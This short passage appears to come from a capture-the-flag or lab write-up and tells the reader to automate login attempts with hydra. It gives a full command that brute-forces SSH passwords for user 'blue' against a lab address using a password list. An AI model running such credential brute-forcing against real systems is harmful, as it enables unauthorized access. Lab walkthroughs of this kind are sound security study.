to not manually try to log in, use hydra with the file to automate

hydra -t 16 -l blue -P passlist.txt -vV 10.10.14.32 ssh

![](hydra.png)
